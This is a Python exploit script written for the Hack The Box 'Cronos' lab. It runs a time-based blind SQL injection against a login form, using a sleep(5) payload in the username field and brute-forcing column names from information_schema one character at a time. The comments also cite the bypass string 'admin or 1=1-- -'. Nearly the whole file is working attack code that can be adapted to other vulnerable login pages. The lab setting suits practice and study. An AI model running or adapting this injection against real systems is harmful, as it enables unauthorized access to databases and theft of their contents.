#!/usr/bin/python3
# This script will work on any Hack The Box with http. 
# It must have a login url that you got access to using 'admin or 1=1-- -
# You may have to change additional parameters.
# This iteration is for the columns only

from pwn import *
import requests, time, string, pdb, signal

def def_handler(sig, frame):

    print("\n\n[!] Exiting the HTB Cronos SQL Injection Script...\n")
    sys.exit(1)

# CTRL+C
signal.signal(signal.SIGINT, def_handler)

#time.sleep(10)
# GLOBAL VARIABLES
login_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

    p1 = log.progress("SQLI")
    p1.status("Initiating brute force attack...")

    p2 = log.progress("Columns:")

    time.sleep(2)

    column_name = ""

    for column in range(0, 5):
        for position in range(1, 10):
            for character in characters:

                post_data = {
                'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character), 
                'password': 'admin'
                }

                p1.status(post_data['username'])
                #time.sleep(1)

                time_start = time.time()
                r =requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    column_name += character
                    p2.status(column_name)
                    break
        column_name += ", "

if __name__ == '__main__':


    makeRequest()